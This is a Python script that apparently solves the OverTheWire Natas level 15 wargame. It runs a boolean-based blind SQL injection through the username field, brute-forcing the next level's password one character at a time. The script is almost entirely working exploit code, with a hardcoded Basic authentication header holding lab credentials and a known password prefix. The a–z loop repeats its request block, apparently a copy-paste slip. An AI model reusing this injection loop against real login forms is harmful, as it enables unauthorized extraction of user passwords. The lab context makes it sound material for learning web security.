import requests


def get_password():
    password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

    while len(password) < 32:
        for i in range(48, 58):  # 0-9
            char = chr(i)
            query = f'natas16" AND password LIKE BINARY "{password + char}%'
            r = requests.post(
                "http://natas15.natas.labs.overthewire.org/index.php",
                headers={
                    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="
                },
                data={"username": query},
            )

            if "This user exists" in r.text:
                password += chr(i)
                print(password)
            else:
                print(f' {password + char} not found')

            if "Error in query" in r.text:
                print("Error in query")

        for i in range(65, 91):  # A-Z
            char = chr(i)
            query = f'natas16" AND password LIKE BINARY "{password + char}%'
            r = requests.post(
                "http://natas15.natas.labs.overthewire.org/index.php",
                headers={
                    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="
                },
                data={"username": query},
            )

            if "This user exists" in r.text:
                password += chr(i)
                print(password)
            else:
                print(f' {password + char} not found')

            if "Error in query" in r.text:
                print("Error in query")

        for i in range(97, 123):  # a-z
            char = chr(i)
            query = f'natas16" AND password LIKE BINARY "{password + char}%'
            r = requests.post(
                "http://natas15.natas.labs.overthewire.org/index.php",
                headers={
                    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="
                },
                data={"username": query},
            )

            if "This user exists" in r.text:
                password += chr(i)
                print(password)
            else:
                print(f' {password + char} not found')

            if "Error in query" in r.text:
                print("Error in query")
            char = chr(i)
            query = f'natas16" AND password LIKE BINARY "{password + char}%'
            r = requests.post(
                "http://natas15.natas.labs.overthewire.org/index.php",
                headers={
                    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="
                },
                data={"username": query},
            )

            if "This user exists" in r.text:
                password += chr(i)
                print(password)
            else:
                print(f' {password + char} not found')

            if "Error in query" in r.text:
                print("Error in query")

        print(len(password))

    print(password)

get_password()
